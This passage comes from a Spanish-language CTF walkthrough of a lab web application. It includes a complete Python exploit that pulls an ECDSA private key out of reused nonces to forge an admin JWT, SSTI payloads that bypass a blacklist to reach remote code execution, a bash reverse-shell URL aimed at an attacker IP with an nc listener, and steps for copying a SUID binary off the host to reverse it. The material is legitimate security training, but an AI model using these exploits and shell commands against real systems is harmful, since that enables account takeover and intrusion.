            ticket = Tickets.query.filter_by(id=id).first()
            ticket.status = "Read"
            db.session.commit()
            message = ticket.message
            user = Users.query.filter_by(username=ticket.user_sent).first()
            email = user.email
            
            # BLACKLIST INEFECTIVA
            blacklist = ["__classes__","request[request.","__","file","write"]
            for bad_string in blacklist:
                if bad_string in message:
                    return render_template('home/500.html')
            for bad_string in blacklist:
                if bad_string in email:
                    return render_template('home/500.html')
            for bad_string in blacklist:
                for param in request.args:
                    if bad_string in request.args[param]:
                        return render_template('home/500.html')
            
            # VULNERABILIDAD: Template Injection
            rendered_template = render_template("home/ticket.html", ticket=ticket,segment="tickets", email=email)
            return render_template_string(rendered_template)  # ¡PELIGROSO!
```

**Vulnerabilidades en `view_ticket`:**

1. **Server-Side Template Injection (SSTI)**:

* Usa `render_template_string()` con contenido que viene del usuario (`ticket.message`)
* La blacklist es muy limitada y fácil de evadir
* Solo bloquea `__classes__`, `request[request.`, `__`, `file`, `write`

2. **Blacklist bypass posible**:

```python
# La blacklist no bloquea:
- {{config}}  # Acceder a configuración
- {{self}}    # Objeto template
- {{''.__class__}}  # Usar '' en lugar de __
- {{request.args}}  # Acceder a parámetros
```

Esto lo que hace es que cuando el `admin` o los usuarios que tengan el privilegio de `admin` vean ese `ticket` se ejecutara el `SSTI` ya que no se sanitiza, a demas veremos en la pagina lo siguiente:

```
tony will be handling your requests today
```

Esto nos dice que el usuario `tony` estara viendo todos los `tickets` que vayamos creando, por lo que vamos a realizar una prueba de la vulnerabilidad enviando un `SSTI` pero despues de un tiempo no veremos resultados ya que no lee nunca los tickets.

### Firmas ECDSA vulnerable (valor "k" reutilizado)

Despues de un rato investigando mas el `.git` nos encontramos con un archivo bastante interesante llamado `custom_jwt.py` el cual si lo leemos veremos que tiene una vulnerabilidad grave de firmas `ECDSA`.

El sistema implementa un mecanismo de autenticación mediante JSON Web Tokens (JWT) firmados con ECDSA (Elliptic Curve Digital Signature Algorithm). La vulnerabilidad crítica se encuentra en la implementación del nonce `k`, que debe ser único para cada firma.

**Análisis del código vulnerable:**

```python
k = randint(1, q - 1)  # Generado UNA vez al inicio
d = randint(1, q - 1)  # Clave privada

def sign(msg):
    # ¡Reutiliza la MISMA k para TODAS las firmas!
    sig = privkey.sign(bytes_to_long(msghash), k)
```

**Consecuencia criptográfica:**\
En ECDSA, la firma se calcula como:

* `r = (k·G).x mod q`
* `s = k⁻¹(h + r·d) mod q`

Si `k` se reutiliza, un atacante con dos firmas `(r, s₁)` y `(r, s₂)` para mensajes con hashes `h₁` y `h₂` puede resolver:

```
k = (h₁ - h₂)(s₁ - s₂)⁻¹ mod q
d = (s₁·k - h₁)·r⁻¹ mod q
```

**Metodología de explotación:**

1. **Recolección**: Obtener dos tokens JWT válidos de diferentes usuarios (Creados por nosotros)
2. **Detección**: Verificar que `r` es idéntico en ambas firmas (indicador de `k` reutilizado)
3. **Extracción**: Calcular `k` y `d` usando álgebra modular
4. **Falsificación**: Generar un token para cualquier usuario (en nuestro caso `tony`)
5. **Autenticación**: Sustituir la cookie de sesión con el token falsificado

Vamos a crear `2` usuarios para poder sacar la clave privada, hecho esto lo meteremos en un unico script que vamos a crear parar que se nos automatice todo este proceso, hay que tener muy en cuenta el calculo de los valores `k` y `d` ya que vemos en el script que los toma por valores aleatorios, pero investigando un poco descubrimos que podemos adivinar dichos valores si utilizamos muy bien la `algebra modular`.

> generateJWTTony.py

```python
#!/usr/bin/env python3
"""
Exploit para CTF - Vulnerabilidad ECDSA con nonce reutilizado (k)
Automatiza la extracción de claves y generación de JWT falsificado
"""

import base64
import json
import hashlib
import sys
from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature
from Crypto.Util.number import bytes_to_long, long_to_bytes
import libnum

# ============================================================================
# FUNCIONES AUXILIARES
# ============================================================================

def b64(data):
    """Codificación base64 URL-safe"""
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    """Decodificación base64 URL-safe con padding"""
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def print_step(step_num, title):
    """Imprime un paso del proceso de forma clara"""
    print(f"\n{'='*60}")
    print(f"PASO {step_num}: {title}")
    print(f"{'='*60}")

# ============================================================================
# JWT 1: Usuarios 'diseo y diseo1'
# ============================================================================

print_step(1, "TOKENS INICIALES")
print("Tokens proporcionados para el análisis:")

jwt1 = "<TOKEN_USER_1>"
jwt2 = "<TOKEN_USER_2>"

print(f"\nJWT 1: {jwt1[:50]}...")
print(f"JWT 2: {jwt2[:50]}...")

# Decodificar para ver contenido
print("\nContenido decodificado:")
print("-" * 40)

def decode_jwt_simple(jwt):
    """Decodifica un JWT para mostrar su contenido"""
    parts = jwt.split('.')
    try:
        header = json.loads(unb64(parts[0]))
        data = json.loads(unb64(parts[1]))
        return header, data
    except:
        return {}, {}

header1, data1 = decode_jwt_simple(jwt1)
header2, data2 = decode_jwt_simple(jwt2)

print(f"JWT1 - Header: {header1}")
print(f"JWT1 - Data:   {data1}")
print()
print(f"JWT2 - Header: {header2}")
print(f"JWT2 - Data:   {data2}")

# ============================================================================
# PASO 2: Verificar vulnerabilidad (k reutilizado)
# ============================================================================

print_step(2, "DETECCIÓN DE VULNERABILIDAD")

def get_r_from_jwt(jwt):
    """Extrae el componente 'r' de la firma ECDSA"""
    parts = jwt.split('.')
    sig_encoded = parts[2]
    sig_bytes = unb64(sig_encoded)
    sig_int = bytes_to_long(sig_bytes)
    r = sig_int >> 256  # Extraer r (primeros 256 bits)
    return r

r1 = get_r_from_jwt(jwt1)
r2 = get_r_from_jwt(jwt2)

print(f"r1 (de JWT1) = {r1}")
print(f"r2 (de JWT2) = {r2}")
print()

if r1 == r2:
    print("✅ ¡VULNERABLE! Se reutilizó el nonce 'k' en ambas firmas.")
    print(f"   Valor reutilizado: r = {r1}")
else:
    print("❌ No se detectó reutilización de k")
    sys.exit(1)

# ============================================================================
# PASO 3: Extraer componentes de las firmas
# ============================================================================

print_step(3, "EXTRACCIÓN DE COMPONENTES DE FIRMA")

# Separar componentes de ambos JWT
head1, data1, sig1_encoded = jwt1.split('.')
head2, data2, sig2_encoded = jwt2.split('.')

# Calcular hashes de los mensajes firmados
msg1 = f"{head1}.{data1}"
msg2 = f"{head2}.{data2}"

h1 = bytes_to_long(hashlib.sha256(msg1.encode()).digest())
h2 = bytes_to_long(hashlib.sha256(msg2.encode()).digest())

print(f"Hash del mensaje 1 (h1): {h1}")
print(f"Hash del mensaje 2 (h2): {h2}")

# Decodificar firmas
sig1_bytes = unb64(sig1_encoded)
sig2_bytes = unb64(sig2_encoded)

sig1_int = bytes_to_long(sig1_bytes)
sig2_int = bytes_to_long(sig2_bytes)

# Crear objetos Signature
sig1 = Signature(sig1_int >> 256, sig1_int % (2 ** 256))
sig2 = Signature(sig2_int >> 256, sig2_int % (2 ** 256))

r1, s1 = sig1.r, sig1.s
r2, s2 = sig2.r, sig2.s

print(f"\nFirma 1: r={r1}, s={s1}")
print(f"Firma 2: r={r2}, s={s2}")

if r1 != r2:
    print("❌ Error: los valores r deberían ser iguales con k reutilizado")
    sys.exit(1)

# ============================================================================
# PASO 4: Calcular clave privada (d) y nonce (k)
# ============================================================================

print_step(4, "CÁLCULO DE CLAVES PRIVADAS")

G = generator_256
q = G.order()

print(f"Orden del grupo (q): {q}")

# Calcular k usando la fórmula: k = (h1 - h2) / (s1 - s2) mod q
s_diff = (s1 - s2) % q
h_diff = (h1 - h2) % q

s_diff_inv = libnum.invmod(s_diff, q)
k = (h_diff * s_diff_inv) % q

print(f"Nonce k calculado: {k}")

# Calcular d usando la fórmula: d = (s1*k - h1) / r mod q
# O usando la forma más estable: d = ((s2*h1 - s1*h2) / (r*(s1-s2))) mod q
valinv = libnum.invmod(r1 * (s1 - s2), q)
d = (((s2 * h1) - (s1 * h2)) * valinv) % q

print(f"Clave privada d calculada: {d}")

# Verificar que las claves son correctas
pubkey = Public_key(G, G * d)
privkey = Private_key(pubkey, d)

print("\n✅ Claves calculadas correctamente")

# ============================================================================
# PASO 5: Generar JWT para usuario 'tony'
# ============================================================================

print_step(5, "GENERACIÓN DE JWT FALSIFICADO")

def sign_with_keys(msg, privkey, k_value):
    """Firma un mensaje usando las claves extraídas"""
    msghash = hashlib.sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k_value)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def create_jwt(data):
    """Crea un JWT válido usando las claves extraídas"""
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    
    # Usar el mismo k que se reutilizó
    _sig = sign_with_keys(f"{_header}.{_data}".replace("=", ""), privkey, k)
    
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt

# Datos objetivo para usuario 'tony'
target_data = {
    'username': 'tony',
    'email': 'tony@amzcorp.local',
    'account_status': True
}

print(f"Datos objetivo: {target_data}")

# Generar JWT falsificado
tony_jwt = create_jwt(target_data)

print(f"\n🔑 JWT GENERADO PARA TONY:")
print(f"{tony_jwt}")

# ============================================================================
# PASO 6: Verificación (opcional)
# ============================================================================

print_step(6, "VERIFICACIÓN")

# Verificar que el JWT generado es válido
def verify_jwt(jwt, pubkey):
    """Verifica un JWT usando la clave pública"""
    _header, _data, _sig = jwt.split('.')
    sig_bytes = unb64(_sig)
    sig_int = bytes_to_long(sig_bytes)
    signature = Signature(sig_int >> 256, sig_int % 2**256)
    msghash = bytes_to_long(hashlib.sha256((f"{_header}.{_data}").encode()).digest())
    return pubkey.verifies(msghash, signature)

if verify_jwt(tony_jwt, pubkey):
    print("✅ JWT generado pasa verificación con la clave pública")
else:
    print("❌ JWT generado NO pasa verificación")

# ============================================================================
# INSTRUCCIONES FINALES
# ============================================================================

print_step(7, "INSTRUCCIONES PARA EL CTF")
print("""
1. Copia el JWT generado para 'tony':
   {}

2. En el navegador, usa las herramientas de desarrollador (F12):
   - Ve a Application/Storage/Cookies
   - Reemplaza el valor de la cookie de sesión con el JWT anterior
   - Recarga la página

3. Deberías tener acceso al panel de administración como usuario 'tony'.
""".format(tony_jwt))

# Decodificar el JWT generado para verificar
print("\nContenido del JWT generado:")
print("-" * 40)
header_gen, data_gen = decode_jwt_simple(tony_jwt)
print(f"Header: {header_gen}")
print(f"Data:   {data_gen}")
```

Ahora lo ejecutaremos de esta forma:

```shell
python3 generateJWTTony.py
```

Info:

```
============================================================
PASO 1: TOKENS INICIALES
============================================================
Tokens proporcionados para el análisis:

JWT 1: eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImRpc2VvMSIsI...
JWT 2: eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6ImRpc2VvIiwiZ...

Contenido decodificado:
----------------------------------------
JWT1 - Header: {'alg': 'ES256'}
JWT1 - Data:   {'username': 'diseo1', 'email': 'diseo1@test.com', 'account_status': True}

JWT2 - Header: {'alg': 'ES256'}
JWT2 - Data:   {'username': 'diseo', 'email': 'diseo@test.com', 'account_status': True}

============================================================
PASO 2: DETECCIÓN DE VULNERABILIDAD
============================================================
r1 (de JWT1) = 12141440778014773830306294392052172817435507941142901017885254463352016327794
r2 (de JWT2) = 12141440778014773830306294392052172817435507941142901017885254463352016327794

✅ ¡VULNERABLE! Se reutilizó el nonce 'k' en ambas firmas.
   Valor reutilizado: r = 12141440778014773830306294392052172817435507941142901017885254463352016327794

============================================================
PASO 3: EXTRACCIÓN DE COMPONENTES DE FIRMA
============================================================
Hash del mensaje 1 (h1): 93997266415245337355302459244008186384607321440031805961248146541769070617673
Hash del mensaje 2 (h2): 103028626970929219506296933915326198009618688995362716099155770691389750203184

Firma 1: r=12141440778014773830306294392052172817435507941142901017885254463352016327794, s=88314335307229110240874611696519387664472532779680604921941829920984134889929
Firma 2: r=12141440778014773830306294392052172817435507941142901017885254463352016327794, s=20906864050950379496134218282772753466784134366463665934254124920302989188171

============================================================
PASO 4: CÁLCULO DE CLAVES PRIVADAS
============================================================
Orden del grupo (q): 115792089210356248762697446949407573529996955224135760342422259061068512044369
Nonce k calculado: 28022298094008699681745677504939107939033267427240628291136183277253235287069
Clave privada d calculada: 15750900670929573931859065885724098217108887977098341643222028413134406854549

✅ Claves calculadas correctamente

============================================================
PASO 5: GENERACIÓN DE JWT FALSIFICADO
============================================================
Datos objetivo: {'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}

🔑 JWT GENERADO PARA TONY:
eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.GtfP3B7FFG6AYQIBf0JZyfRrv_qPqHSr_M5p8xOd1HLWki4fDvltNJkuT01ndbpcBGiwICSlPUz1tTRQ7E7O-g

============================================================
PASO 6: VERIFICACIÓN
============================================================
✅ JWT generado pasa verificación con la clave pública

============================================================
PASO 7: INSTRUCCIONES PARA EL CTF
============================================================

1. Copia el JWT generado para 'tony':
   eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.GtfP3B7FFG6AYQIBf0JZyfRrv_qPqHSr_M5p8xOd1HLWki4fDvltNJkuT01ndbpcBGiwICSlPUz1tTRQ7E7O-g

2. En el navegador, usa las herramientas de desarrollador (F12):
   - Ve a Application/Storage/Cookies
   - Reemplaza el valor de la cookie de sesión con el JWT anterior
   - Recarga la página

3. Deberías tener acceso al panel de administración como usuario 'tony'.


Contenido del JWT generado:
----------------------------------------
Header: {'alg': 'ES256'}
Data:   {'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}
```

Veremos que ha funcionado, por lo que si intercambiamos en la `cookie` llamada `aws_auth` el valor que tenemos lo eliminamos y ponemos lo que nos ha generado, recargaremos la pagina y no notaremos gran cambio, pero si nos vamos al panel de `admin` de esta forma:

```
URL = http://company-support.amzcorp.local/admin/tickets
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251227132225.png" alt=""><figcaption></figcaption></figure>

Veremos que si nos deja, por lo que estamos utilizando los privilegios de `tony` pero no se refleja en la pagina que seamos dicho usuario, pero podremos hacer cosas con los privilegios dentro de la pagina con dicho `TOKEN`.

Si leemos un ticket en concreto de `christian` veremos lo siguiente:

```
From: christian

Adding here for reference that we have updated the CloudFormation template for LocalStack: http://company-support.amzcorp.local/static/uploads/CF_Prod_Template.yml 

The changes are live now.
```

Vamos a probar a descargarnos esa plantilla y ver que contiene.

> CF\_Prod\_Template.yml

```yml
AWSTemplateFormatVersion: 2010-09-09
Resources:
  LambdaFunction:
    Type: 'AWS::Lambda::Function'
    Properties:
      Code:
        ZipFile: |
          import json
          def lambda_handler(event, context):
            try:
              #ToDo
      FunctionName: tracking_api
      Handler: index.lambda_handler
      Runtime: python3.9
      Role: !GetAtt
        - LambdaExecutionRole
        - Arn
    DependsOn:
      - LambdaExecutionRole
  LambdaExecutionRole:
    Type: 'AWS::IAM::Role'
    Properties:
      RoleName: LambdaExecutionRole
      Policies:
        - PolicyName: LambdaPolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Action:
                  - 'logs:CreateLogGroup'
                  - 'logs:CreateLogStream'
                  - 'logs:PutLogEvents'
                Effect: Allow
                Resource:
                  - '*'
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          - Action:
              - 'sts:AssumeRole'
            Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
  APIGatewayRestAPI:
    Type: 'AWS::ApiGateway::RestApi'
    Properties:
      Name: tracking_api
      EndpointConfiguration:
        Types:
          - REGIONAL
    DependsOn:
      - LambdaFunction
  APIGatewayResource:
    Type: 'AWS::ApiGateway::Resource'
    Properties:
      RestApiId: !Ref APIGatewayRestAPI
      ParentId: !GetAtt
        - APIGatewayRestAPI
        - RootResourceId
      PathPart: track
    DependsOn:
      - APIGatewayRestAPI
  APIGatewayMethod:
    Type: 'AWS::ApiGateway::Method'
    Properties:
      RestApiId: !Ref APIGatewayRestAPI
      ResourceId: !Ref APIGatewayResource
      HttpMethod: GET
      AuthorizationType: AWS_IAM
      MethodResponses:
        - StatusCode: 200
      Integration:
        Type: AWS_PROXY
        IntegrationResponses:
          - StatusCode: 200
        IntegrationHttpMethod: POST
        Uri: !Sub
          - >-
            arn:aws:apigateway:us-east-2:lambda:path/2015-03-31/functions/${LambdaFuncNameArn}/invocations
          - LambdaFuncNameArn: !GetAtt LambdaFunction.Arn
    DependsOn:
      - APIGatewayResource
  APIGatewayDeployment:
    Type: 'AWS::ApiGateway::Deployment'
    Properties:
      RestApiId: !Ref APIGatewayRestAPI
      StageName: default
    DependsOn:
      - APIGatewayMethod
  APIGatewayPermission:
    Type: 'AWS::Lambda::Permission'
    Properties:
      Action: 'lambda:InvokeFunction'
      FunctionName: !GetAtt LambdaFunction.Arn
      Principal: apigateway.amazonaws.com
    DependsOn:
      - APIGatewayDeployment
  DynamoDBTable:
    Type: 'AWS::DynamoDB::Table'
    Properties:
      TableName: Users
      AttributeDefinitions:
        - AttributeName: username
          AttributeType: S
        - AttributeName: password
          AttributeType: S
      KeySchema:
        - AttributeName: username
          KeyType: HASH
        - AttributeName: password
          KeyType: RANGE
      ProvisionedThroughput:
        ReadCapacityUnits: '5'
        WriteCapacityUnits: '5'
  DynamoDBTable:
    Type: 'AWS::DynamoDB::Table'
    Properties:
      TableName: Backup_Users
      AttributeDefinitions:
        - AttributeName: username
          AttributeType: S
        - AttributeName: password
          AttributeType: S
      KeySchema:
        - AttributeName: username
          KeyType: HASH
        - AttributeName: password
          KeyType: RANGE
      ProvisionedThroughput:
        ReadCapacityUnits: '5'
        WriteCapacityUnits: '5'
  JohnUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: john
      Path: /
      Policies:
        - PolicyName: dynamodb-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'dynamodb:Scan'
                Resource: '*'
  WillUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: will
      Path: /
      Policies:
        - PolicyName: lambda-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'Lambda:CreateFunction'
                  - 'Lambda:InvokeFunction'
                  - 'IAM:PassRole'
                Resource: ['arn:aws:lambda:*:*:function:*','arn:aws:iam::*:role/serviceadm']
  RebeccaUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: rebecca
      Path: /
      Policies:
        - PolicyName: apigw-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'ApiGateway:GetRestApis'
                Resource: '*'
  RoyUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: roy
      Path: /
      Policies:
        - PolicyName: inventory-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'S3:ListBucket'
                  - 'S3:GetObject'
                  - 'S3:PutObject'
                Resource: ['arn:aws:s3:::assets','arn:aws:s3:::assets/*']
              - Effect: Allow
                Action:
                  - 'SNS:ListTopics'
                  - 'SNS:Subscribe'
                  - 'SNS:Publish'
                Resource: '*'
  ServiceRole:
    Type: 'AWS::IAM::Role'
    Properties:
      RoleName: serviceadm
      Path: /
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
            Action:
              - 'sts:AssumeRole'
      Policies:
        - PolicyName: root
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'IAM:AttachUserPolicy'
                Resource: 'arn:aws:iam::*:user/*'
  Assets:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Join
        - "-"
        - - "assets"
          - !Select
            - 0
            - !Split
              - "-"
              - !Select
                - 2
                - !Split
                  - "/"
                  - !Ref "AWS::StackId"
  Databases:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Join
        - "-"
        - - "databases"
          - !Select
            - 0
            - !Split
              - "-"
              - !Select
                - 2
                - !Split
                  - "/"
                  - !Ref "AWS::StackId"
  Products:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Join
        - "-"
        - - "products"
          - !Select
            - 0
            - !Split
              - "-"
              - !Select
                - 2
                - !Split
                  - "/"
                  - !Ref "AWS::StackId"
  Releases:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Join
        - "-"
        - - "2022-releases"
          - !Select
            - 0
            - !Split
              - "-"
              - !Select
                - 2
                - !Split
                  - "/"
                  - !Ref "AWS::StackId"                  
  Clients:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Join
        - "-"
        - - "clients"
          - !Select
            - 0
            - !Split
              - "-"
              - !Select
                - 2
                - !Split
                  - "/"
                  - !Ref "AWS::StackId"                  
  OTP:
    Type: AWS::SNS::Topic
    Properties: 
      DisplayName: otp
      TopicName: otp              
  SensorQueue:
    Type: AWS::SQS::Queue
    Properties: 
      QueueName: sensor_updates
```

Esto nos puede ser interesante para un futuro a lo mejor.

### SSTI en tickets (Siendo Tony)

Yo anteriormente cuando era el usuario `diseo` envie un `SSTI` para que se realizara una multiplicacion en este caso `7*7` con esa inyeccion, si probamos a entrar en dicho ticket con el cual envie el `payload` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251227132510.png" alt=""><figcaption></figcaption></figure>

Vemos que se esta ejecutando de forma correcta, por lo que la vulnerabilidad si esta funcionando, recordemos que tenemos una `blacklist` por detras que bloquea algunas funciones, si vamos a una pagina muy famosa...

URL = [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-subprocesspopen)

En la parte de `SSTI` podremos tener de referencia algunos `payloads` sin utilizar los que esten en la `blacklist` con el objetivo de intentar realizar un `RCE` desde los `tickets`.

Por lo que vemos no esta bloqueando `subject`, podemos tirar por ahi... Vamos a utilizar `2` perfiles diferentes de navegadores, para tener `Cookies` separadas e ir creando un `ticket` con `SSTI` en un perfil de usuario normal en mi caso `diseo` y en el otro navegador tener el `TOKEN` de `tony` para leer el ticket y ejecutar el `SSTI`.

<figure><img src="../../.gitbook/assets/Pasted image 20251227140006.png" alt=""><figcaption></figcaption></figure>

Si creamos un `ticket` metiendo este `payload`...

> payload (Enumerar subclases disponibles)

```
{{().__class__.__base__.__subclasses__()}}
```

Tendremos que crear el `ticket` de esta forma:

<figure><img src="../../.gitbook/assets/Pasted image 20251227140936.png" alt=""><figcaption></figcaption></figure>

Lo enviamos y desde el otro perfil con el `TOKEN` de `tony` abrimos el `ticket`, por lo que veremos esto:

<figure><img src="../../.gitbook/assets/Pasted image 20251227141008.png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando, vamos a utilizar otro `payload` para poder ejecutar codigo de forma remota, nuestro `payload` seria el siguiente:

> payload (Realizar RCE atraves de un parametro)

```
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}
```

Haciendo lo mismo que antes, entramos al `ticket` con ese `payload` inyectado y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251227141604.png" alt=""><figcaption></figcaption></figure>

No ha saltado ningun error ni nada, por lo que probemos a ejecutar un comando de esta forma en la `URL`:

```
URL = http://company-support.amzcorp.local/admin/tickets/view/4?cmd=whoami
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251227141722.png" alt=""><figcaption></figcaption></figure>

Veremos que esta funcionando por lo que vamos a establecer una `reverse shell`.

```
URL = http://company-support.amzcorp.local/admin/tickets/view/4?cmd=bash -c "bash -i >%26 /dev/tcp/<IP_ATTACKER>/<PORT> 0>%261"
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos esa `URL` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.105] from (UNKNOWN) [10.13.37.15] 61485
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@d77274080e09:~/web$ whoami
whoami
www-data
```

Vemos que ha funcionado, por lo que seremos el usuario `www-data`, pero vamos a sanitizar la `shell` de esta forma:

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Una vez sanitizado todo podremos leer la `flag` con calma.

```shell
cd ~
cat flag.txt
```

Info:

```
AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
```

Con esto habremos conseguido la siguiente `flag`.

> Relentless (Flag)

```
AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
```

## Magnified

Si leemos el `.env` de la carpeta `web` veremos lo siguiente:

```shell
cat web/.env
```

Info:

```
#DEBUG=True
#SECRET_KEY=S3cr3t_K#Key
#DB_ENGINE=postgresql
#DB_NAME=appseed-flask
#DB_HOST=localhost
#DB_PORT=5432
#DB_USERNAME=appseed
#DB_PASS=pass
```

Vemos muchisima informacion interesante pero nada que hacer con ello, si filtramos por permisos `SUID` veremos un binario bastante interesante:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
1839198     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
  1839300     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
  1839099     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh
  1839453     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
  1839090     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
  1839283     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
  1839403     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
  1839288     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
  1338388     28 -rwsr-xr-x   1 root     root        25040 Feb  9  2022 /usr/bin/backup_tool
  1465971    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
  2912756    464 -rwsr-xr-x   1 root     root       473576 Dec  2  2021 /usr/lib/openssh/ssh-keysign
  3167245     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

En concreto este de aqui:

```
1338388  28 -rwsr-xr-x   1 root  root   25040 Feb  9  2022 /usr/bin/backup_tool
```

Vamos a pasarnos el binario a nuestra maquina atacante, para ello si abrimos un servidor de `python3` no podremos tener conexion ya que se realiza alguna tunelizacion de `IP` por detras la cual no resuleve bien nuestro servidor, por lo que vamos a copiar el binario a un apartado en el que si podremos obtener de la web.

```shell
cp /usr/bin/backup_tool /var/www/web/apps/static/uploads/backup_tool
```

Ahora si visitamos desde la pagina la siguiente `URL`.

```
URL = http://company-support.amzcorp.local/static/uploads/backup_tool
```

Veremos que nos descarga el binario:

```
drwxr-xr-x root  root  4.0 KB Sat Dec 27 16:03:44 2025 .
drwxr-xr-x root  root  4.0 KB Sat Dec 27 14:42:31 2025 ..
.rwxrwxr-x diseo diseo  24 KB Sat Dec 27 16:03:22 2025 backup_tool
```

Ahora vamos a utilizar `ghidra` para decompilar el binario y realizar ingenieria inversa, para ver como funciona por dentro, ya que si lo ejecutamos de primeras nos pide usuario y contraseña para utilizarla.

```shell
ghidra
```

Habiendo creado un proyecto dentro de la herramienta e importando el binario veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251227161101.png" alt=""><figcaption></figcaption></figure>

Investigando el codigo del binario veremos una funcion llamada `a` que contiene los siguiente:

```c
undefined8 a(void)

{
  int iVar1;
  char *pcVar2;
  long lVar3;
  
  puts("Enter your credentials to continue:");
  printf("Username: ");
  pcVar2 = (char *)g_u();
  __isoc99_scanf("%127s",username);
  printf("Password: ");
  __isoc99_scanf("%127s",password);
  iVar1 = strcmp(username,pcVar2);
  if (iVar1 != 0) {
    puts("Incorrect Credentials!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar2 = (char *)g_p();
  iVar1 = strcmp(password,pcVar2);
  if (iVar1 != 0) {
    puts("Incorrect Credentials!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  lVar3 = g_o();
  printf("OTP: ");
  __isoc99_scanf(&DAT_001030fd,&otp);
  if (lVar3 != otp) {
    puts("Incorrect Credentials!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  l_m();
  return 0;
}
```

Vamos a utilizar esta informacion para utilizar la herramienta `gdb` y crear los `endpoints` necesarios para descubrir las credenciales.

```shell
wget http://ftp.debian.org/debian/pool/main/o/openssl/libssl1.1_1.1.1w-0+deb11u1_amd64.deb
mkdir -p ~/openssl1.1
dpkg -x libssl1.1_1.1.1w-0+deb11u1_amd64.deb ~/openssl1.1/
LD_LIBRARY_PATH=~/openssl1.1/usr/lib/x86_64-linux-gnu gdb ./backup_tool
```

Info:

```
GNU gdb (Debian 16.3-5) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
